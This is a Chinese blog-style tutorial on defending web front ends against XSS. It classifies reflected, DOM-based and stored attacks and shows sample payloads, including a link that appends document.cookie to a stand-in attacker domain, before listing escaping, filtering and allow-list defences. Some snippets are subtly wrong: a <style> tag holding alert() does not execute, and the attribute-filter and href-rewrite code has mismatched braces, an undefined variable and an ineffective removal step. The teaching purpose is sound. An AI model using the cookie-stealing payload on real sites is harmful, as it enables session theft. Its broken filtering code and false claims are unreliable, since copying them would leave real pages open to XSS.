# 前端安全之防御XSS跨站脚本攻击
最近经常被人问到前端安全问题，虽说这方面作为前端不常遇到，但一直被人纠着问就很烦，怒学之。
安全问题通常有XSS跨站脚本攻击和CSRF跨站请求伪造，将分为两篇文章介绍。本文先研究第一种--XSS跨站脚本攻击


## 受攻击原因
页面被注入了恶意代码，当用户访问网页时，嵌入的代码将被执行，从而受到恶意攻击

## xss攻击分类
### 反射型
反射型主要来自用户的主动请求一个带攻击的链接<br>
当用户点击带有xss攻击的链接 `http://test?query=<script>alert('xss')</script>` 时，细分为两种：

* 服务端获取url参数name，并将name解析到html中返回给客户端<br>伪代码:
```html
     <html>
       <div>...</div>
       <script>alert('xss')</script>
     </html>
```
* 服务端没有解析url参数，返回正常的页面。但客户端在js执行过程中，获取了url参数，并将其写入到页面中。该方法也称为DOM型xss攻击<br>
伪代码:
```js
     var query = url.query
     document.body.appendChild(query)
     $('div').html(query)
```
上述两种都将执行注入的脚本

### 存储型
存储型就是将xss攻击代码储存到数据库中，当用户去下次在客户端请求数据时，获取到xss攻击代码。<br/>典型的场景是在提交评论的时候，攻击者将`<script>alert('xss')</script>`提交到服务器。当用户在获取评论数据的时候，服务端会返回这段代码, 从而收到攻击


## 常见的xss攻击场景
* 注入了a标签，href带有xss脚本 
  
  ```html
  (1)
     `<a href="javascript:alert(xss)" ></a>`
  (2)
     var xsshref = 'http://xss.com?' + document.cookie // 攻击者的网站
     <a href=xsshref></a>
  ```
  
* html标签, 内联事件带有xss脚本
  ```html
  1)<div onclick="alert(xss1)" onmouseover="alert(xss2)"><div>
  2)<img src='xss' onerror="alert(xss)" />
  ```

* img, link标签请求攻击者的资源

 ```js
  // 攻击者 nodejs
  const http = require('http')
  
  http.createServer(function (request, response) {
    console.log(request) // 在这里可以获取img的请求
    response.writeHead(200, {'Content-Type': 'text/plain'});
    response.end('');
  }).listen(8080);
  
  // 受攻击者网站
  <img src='http://xss:8080'/>
  <link href="http://localhost:8080" rel="stylesheet">
 ```

* 带有可执行脚本的style标签或者eval语句

  ```html
  (1)
  <style>
    alert('xss')
  </style>
  (2)
  <div id='xss'>alert('xss')</div>
  document.addEventListener('click', function(event) {
  	eval(event.target.innerHTML)
  })
  ```



## 如何防御

xss防御最好还是需要后端进行，尤其是存储型xss攻击。但通过观察xss攻击原理，我们可以发现，对于反射型，前端还是可以有所作为

* 对用户的数据进行转义编码，转化为纯文本而不是代码

* 过滤危险的DOM节点,  如 img，style

* 过滤危险的节点属性，如 on*, href, src，尽量避免用内联事件，用`addEventListener`代替

  ```js
  // 过滤内联事件 // 在addEventListener 中过滤
  <div onclick="alert(xss)" id='xss'>xss</div>
  
  var attributes = document.getElementById('xss').attributes
  for (attr of attributes) {
      if(/^on./.test(attr.name)) {  // 拦截on*事件
        filter(attr)
      }
    }
  }
  function filter(attr) {
    document.addEventListener(attr.name.substr(2), function(e) {
      attr.name = null  //删除内联事件
      myFunc() // 改写事件
    }, true);
  }
  
  ```

* 对`javascript:`，`eval`这类关键字或者语句建立黑名单，对其进行过滤删选

  ```js
  // 如果是a标签且存在'javascript:', 则改写href属性
  if(element.tagName === 'A' && element.protocol === 'javascript:') {
    elem.href = 'javascript:void(0)';
  }
  ```

* 对资源文件建立白名单域名，如img的src属性值，href值只能为白名单下的资源